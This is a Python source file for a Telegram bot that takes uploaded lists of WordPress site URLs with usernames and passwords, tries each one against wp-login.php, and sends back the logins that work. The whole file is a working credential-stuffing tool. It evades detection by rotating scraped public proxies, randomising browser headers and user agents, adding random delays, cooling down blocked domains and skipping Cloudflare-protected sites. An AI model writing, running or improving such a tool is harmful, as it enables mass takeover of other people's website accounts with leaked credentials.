#!/usr/bin/env python3
"""
WP Login Checker Bot - Production Version
Anti-IP Block with Auto Proxy Rotation
"""

import asyncio
import sys

# Fix event loop for Render/Linux
if sys.platform == 'linux':
    try:
        import nest_asyncio
        nest_asyncio.apply()
    except ImportError:
        pass
    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())

import os
import logging
import threading
import aiohttp
import re
import json
import random
import time
from datetime import datetime
from aiohttp_socks import ProxyConnector

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message

# ============ CONFIG ============

API_ID = int(os.environ.get("API_ID", "0") or "0")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMINS = os.environ.get("ADMINS", "")
LEGACY_PROXIES = os.environ.get("PROXIES", "")
MIN_DELAY = float(os.environ.get("MIN_DELAY", "20"))  # Increased default
MAX_DELAY = float(os.environ.get("MAX_DELAY", "50"))  # Increased default
AUTO_REFRESH_PROXIES = os.environ.get("AUTO_REFRESH_PROXIES", "true").lower() == "true"

ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# ============ FLASK SERVER ============

flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "✅ Bot is running", 200

@flask_app.route("/ping")
def ping():
    return {"status": "alive", "proxies": len(_MEMORY_PROXIES)}, 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ IN-MEMORY PROXY STORAGE ============

_MEMORY_PROXIES = []
_LAST_REFRESH = None

# ============ PROXY MANAGER ============

class ProxyManager:
    SOURCES = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=100",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=US&ssl=yes&anonymity=elite&limit=50",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    
    def __init__(self):
        global _MEMORY_PROXIES, _LAST_REFRESH
        self.working_proxies = _MEMORY_PROXIES
        self.last_refresh = _LAST_REFRESH
        self._lock = threading.Lock()
        
        # Initial load
        if not self.working_proxies and AUTO_REFRESH_PROXIES:
            logger.info("No proxies in memory, fetching...")
            self.refresh()
            self.start_auto_refresh()
        elif AUTO_REFRESH_PROXIES:
            logger.info(f"Using {len(self.working_proxies)} cached proxies")
            self.start_auto_refresh()
    
    def get_proxies(self):
        with self._lock:
            return list(self.working_proxies) if self.working_proxies else []
    
    def get_random_proxy(self):
        proxies = self.get_proxies()
        if proxies:
            return random.choice(proxies)
        if LEGACY_PROXIES:
            legacy = [p.strip() for p in LEGACY_PROXIES.split(',') if p.strip()]
            return random.choice(legacy) if legacy else None
        return None
    
    def fetch_all(self):
        """Fetch from all sources"""
        import requests
        all_proxies = []
        
        for url in self.SOURCES:
            try:
                resp = requests.get(url, timeout=20)
                if resp.status_code == 200:
                    for line in resp.text.strip().split('\n'):
                        line = line.strip()
                        if ':' in line and not line.startswith('#'):
                            # Clean proxy format
                            proxy = line.split('@')[-1] if '@' in line else line
                            if not proxy.startswith('http'):
                                proxy = f"http://{proxy}"
                            # Validate format
                            try:
                                ip, port = proxy.replace('http://', '').split(':')
                                if ip.count('.') == 3 and port.isdigit():
                                    all_proxies.append(proxy)
                            except:
                                pass
            except Exception as e:
                logger.debug(f"Source failed: {e}")
        
        # Deduplicate
        seen = set()
        unique = []
        for p in all_proxies:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        
        logger.info(f"Fetched {len(unique)} unique proxies from {len(self.SOURCES)} sources")
        return unique[:150]  # Limit for speed
    
    async def _check_one(self, proxy, session, semaphore):
        """Check single proxy"""
        async with semaphore:
            try:
                connector = ProxyConnector.from_url(proxy)
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as test_session:
                    async with test_session.get("http://httpbin.org/ip") as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            return (proxy, True, data.get('origin', 'unknown'))
            except:
                pass
            return (proxy, False, None)
    
    async def verify_batch(self, proxies):
        """Verify proxies concurrently"""
        semaphore = asyncio.Semaphore(30)  # Max 30 concurrent
        
        async with aiohttp.ClientSession() as session:
            tasks = [self._check_one(p, session, semaphore) for p in proxies]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        working = []
        for r in results:
            if isinstance(r, tuple) and r[1]:
                working.append(r[0])
        
        return working
    
    def refresh(self):
        """Refresh proxy list"""
        global _MEMORY_PROXIES, _LAST_REFRESH
        logger.info("=" * 40)
        logger.info("🔄 Starting proxy refresh...")
        
        try:
            # Fetch
            all_proxies = self.fetch_all()
            if len(all_proxies) < 20:
                logger.warning("Too few proxies fetched, aborting")
                return False
            
            # Verify (run in new event loop)
            logger.info(f"🔍 Testing {len(all_proxies)} proxies...")
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            working = loop.run_until_complete(self.verify_batch(all_proxies))
            
            if len(working) < 5:
                logger.warning(f"Only {len(working)} working, keeping old")
                return False
            
            # Update memory
            with self._lock:
                _MEMORY_PROXIES = working
                _LAST_REFRESH = datetime.now()
                self.working_proxies = _MEMORY_PROXIES
                self.last_refresh = _LAST_REFRESH
            
            logger.info(f"✅ Refresh complete: {len(working)} working proxies")
            return True
            
        except Exception as e:
            logger.error(f"❌ Refresh failed: {e}")
            return False
    
    def _auto_loop(self):
        """Auto refresh every 30 min"""
        while True:
            time.sleep(1800)  # 30 min
            self.refresh()
    
    def start_auto_refresh(self):
        t = threading.Thread(target=self._auto_loop, daemon=True)
        t.start()
        logger.info("⏰ Auto-refresh started (every 30 min)")

# Initialize
proxy_manager = ProxyManager()

def get_random_proxy():
    return proxy_manager.get_random_proxy()

# ============ ANTI-DETECTION ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.0',
]

FAILED_DOMAINS = {}

def get_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': f'"{random.randint(110, 120)}", "Not_A Brand";v="8", "Chromium";v="{random.randint(110, 120)}"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }

def mark_failed(domain):
    FAILED_DOMAINS[domain] = time.time()

def is_cooled(domain):
    if domain in FAILED_DOMAINS:
        return time.time() - FAILED_DOMAINS[domain] < 300
    return False

# ============ PARSER ============

def parse_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url = parts[0]
    rest = ':'.join(parts[1:])
    creds = rest.rsplit(':', 1)
    if len(creds) != 2:
        return None
    
    return (clean_url(url), creds[0], creds[1])

def clean_url(url):
    url = url.strip().lower()
    if not url.startswith('http'):
        url = 'https://' + url
    
    # WordPress paths
    if '/wp-login.php' not in url:
        url = url.rstrip('/') + '/wp-login.php'
    else:
        url = url.split('?')[0]
    
    return url

# ============ LOGIN CHECKER ============

async def check_login(url, user, pwd, max_retry=3):
    domain = url.split('/')[2]
    
    if is_cooled(domain):
        await asyncio.sleep(60)
    
    proxy = get_random_proxy()
    
    for attempt in range(max_retry):
        try:
            # Random delay
            delay = random.uniform(MIN_DELAY, MAX_DELAY)
            if attempt > 0:
                delay += random.uniform(10, 20)
            await asyncio.sleep(delay)
            
            # Setup session
            if proxy:
                try:
                    connector = ProxyConnector.from_url(proxy)
                except:
                    connector = aiohttp.TCPConnector(ssl=False)
            else:
                connector = aiohttp.TCPConnector(ssl=False)
            
            timeout = aiohttp.ClientTimeout(total=30, connect=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                headers = get_headers()
                headers['Referer'] = url
                headers['Origin'] = f"https://{domain}"
                
                # GET login page
                async with session.get(url, headers=headers) as resp:
                    text = await resp.text()
                    
                    if resp.status == 403:
                        mark_failed(domain)
                        return None, {'error': '403 Blocked'}
                    
                    if resp.status == 429:
                        mark_failed(domain)
                        await asyncio.sleep(120)
                        continue
                    
                    # Cloudflare check
                    if any(x in text for x in ['cf-ray', '__cf_bm', 'Just a moment']):
                        mark_failed(domain)
                        return None, {'error': 'Cloudflare'}
                    
                    # Build payload
                    payload = {
                        'log': user,
                        'pwd': pwd,
                        'rememberme': 'forever',
                        'wp-submit': 'Log In',
                        'testcookie': '1'
                    }
                    
                    # Extract hidden fields
                    for match in re.finditer(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', text):
                        name, val = match.groups()
                        if name not in payload and 'csrf' in name.lower():
                            payload[name] = val
                
                # POST login
                await asyncio.sleep(random.uniform(2, 5))
                
                post_headers = headers.copy()
                post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                async with session.post(url, data=payload, headers=post_headers) as resp:
                    final = str(resp.url)
                    text = await resp.text()
                    cookies = [c.key for c in session.cookie_jar]
                    
                    # Success checks
                    if 'wordpress_logged_in' in str(cookies):
                        return True, {'reason': 'Logged in cookie'}
                    
                    if '/wp-admin' in final and 'login' not in final:
                        return True, {'reason': 'Admin redirect'}
                    
                    # Failure checks
                    low = text.lower()
                    if 'incorrect' in low or 'invalid' in low:
                        return False, {'reason': 'Wrong credentials'}
                    
                    if 'captcha' in low or 'recaptcha' in low:
                        return None, {'error': 'Captcha'}
                    
                    return None, {'error': 'Unknown'}
                    
        except asyncio.TimeoutError:
            if attempt == max_retry - 1:
                return None, {'error': 'Timeout'}
            await asyncio.sleep(10)
        except Exception as e:
            if attempt == max_retry - 1:
                return None, {'error': str(e)[:50]}
            await asyncio.sleep(5)
    
    return None, {'error': 'Max retries'}

# ============ BATCH PROCESS ============

async def process_batch(creds, progress=None):
    results = {'valid': [], 'invalid': [], 'error': [], 'total': len(creds)}
    
    for i, (url, user, pwd) in enumerate(creds):
        if progress and i % 2 == 0:
            try:
                await progress(i + 1, len(creds), user)
            except:
                pass
        
        valid, info = await check_login(url, user, pwd)
        line = f"{url}:{user}:{pwd}"
        
        if valid is True:
            results['valid'].append({'line': line, 'info': info})
        elif valid is False:
            results['invalid'].append({'line': line, 'info': info})
        else:
            results['error'].append({'line': line, 'info': info})
    
    return results

# ============ BOT ============

bot = Client("wp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start"))
async def cmd_start(c, m):
    uid = m.from_user.id
    await m.reply(f"""👋 **WP Checker Bot**

**Your ID:** `{uid}`

**Commands:**
• `/check <url> <user> <pass>` - Single check
• `/checkfile` - Upload .txt file
• `/status` - Bot status
• `/refresh` - Refresh proxies

**Format:**
`https://site.com:admin:password`

Add `{uid}` to ADMINS env var.""")

@bot.on_message(filters.command("status"))
async def cmd_status(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    px = proxy_manager.get_proxies()
    lr = proxy_manager.last_refresh
    
    await m.reply(f"""📊 **Status**

🤖 Bot: **Online**
📡 Proxies: **{len(px)}** working
⏱️ Delay: **{MIN_DELAY}s - {MAX_DELAY}s**
🔄 Auto-refresh: **{'On' if AUTO_REFRESH_PROXIES else 'Off'}**
🕐 Last refresh: **{lr.strftime('%H:%M:%S') if lr else 'Never'}**

**Protection:**
✅ Proxy rotation
✅ Random delays  
✅ Domain cooldown
✅ Cloudflare skip""")

@bot.on_message(filters.command("refresh"))
async def cmd_refresh(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    msg = await m.reply("🔄 Refreshing proxies...")
    ok = proxy_manager.refresh()
    
    if ok:
        await msg.edit(f"✅ Refreshed! **{len(proxy_manager.get_proxies())}** proxies ready")
    else:
        await msg.edit("⚠️ Refresh failed, using existing")

@bot.on_message(filters.command("check"))
async def cmd_check(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    args = m.text.split()[1:]
    if len(args) < 3:
        return await m.reply("❌ Usage: `/check url user pass`")
    
    url = clean_url(args[0])
    user, pwd = args[1], ' '.join(args[2:])
    
    msg = await m.reply(f"⏳ Checking `{user}`...")
    
    try:
        valid, info = await check_login(url, user, pwd)
        
        if valid is True:
            text = f"""✅ **VALID**

🔗 `{url}`
👤 `{user}`
🔑 `{pwd}`
📋 {info.get('reason')}"""
        elif valid is False:
            text = f"""❌ **INVALID**

🔗 `{url}`
👤 `{user}`
📋 {info.get('reason')}"""
        else:
            text = f"""⚠️ **ERROR**

🔗 `{url}`
👤 `{user}`
❌ {info.get('error')}"""
        
        await msg.edit(text)
    except Exception as e:
        await msg.edit(f"❌ Error: `{e}`")

@bot.on_message(filters.document & filters.private)
async def handle_file(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    if not m.document.file_name.endswith('.txt'):
        return await m.reply("❌ Only .txt files")
    
    if m.document.file_size > 5 * 1024 * 1024:
        return await m.reply("❌ Max 5MB")
    
    msg = await m.reply("📥 Downloading...")
    
    try:
        path = await m.download()
        
        # Parse
        creds = []
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                p = parse_line(line)
                if p:
                    creds.append(p)
        
        if not creds:
            os.remove(path)
            return await msg.edit("❌ No valid credentials")
        
        total = len(creds)
        await msg.edit(f"🔍 Found **{total}** credentials\n⏱️ ETA: ~{total * 35 // 60} minutes")
        
        # Progress callback
        async def prog(cur, tot, user):
            if cur % 5 == 0:
                try:
                    await msg.edit(
                        f"🔍 **{cur}/{tot}**\n"
                        f"Current: `{user[:20]}`..."
                    )
                except:
                    pass
        
        # Process
        start = time.time()
        results = await process_batch(creds, prog)
        elapsed = time.time() - start
        
        # Save valid
        valid_file = f"valid_{datetime.now():%Y%m%d_%H%M%S}.txt"
        with open(valid_file, 'w') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Summary
        summary = f"""✅ **Complete!**

📊 Total: **{total}**
✅ Valid: **{len(results['valid'])}**
❌ Invalid: **{len(results['invalid'])}**
⚠️ Errors: **{len(results['error'])}**
⏱️ Time: **{elapsed//60:.0f}m {elapsed%60:.0f}s**

📎 Valid logins attached:"""
        
        await msg.edit(summary)
        await m.reply_document(valid_file, caption="✅ Valid credentials")
        
        # Cleanup
        os.remove(path)
        os.remove(valid_file)
        
    except Exception as e:
        logger.error(f"File error: {e}")
        await msg.edit(f"❌ Error: `{e}`")

# ============ MAIN ============

if __name__ == "__main__":
    # Start Flask
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("🌐 Flask started")
    
    # Start bot
    logger.info("🤖 Starting bot...")
    bot.run()
